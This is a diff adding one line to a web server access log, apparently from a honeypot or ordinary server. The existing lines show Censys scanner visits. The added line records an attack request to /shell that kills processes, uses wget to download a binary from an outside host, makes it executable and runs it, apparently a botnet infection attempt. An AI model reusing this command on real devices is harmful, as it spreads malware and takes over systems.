@@ -242,3 +242,4 @@
 206.168.34.60 - - [20/Oct/2024:12:38:38 +0800] "GET / HTTP/1.1" 200 268 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
 206.168.34.60 - - [20/Oct/2024:12:38:39 +0800] "GET /favicon.ico HTTP/1.1" 404 382 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
 206.168.34.60 - - [20/Oct/2024:12:38:40 +0800] "PRI * HTTP/2.0" 400 486 "-" "-"
+141.98.11.67 - - [20/Oct/2024:12:55:49 +0800] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+arm4+arm7;wget+http:/\\/server.eye-network.ru/wheiuwa4;chmod+777+wheiuwa4;./wheiuwa4+jaws;rm+-rf+wheiuwa4 HTTP/1.1" 404 419 "-" "KrebsOnSecurity"
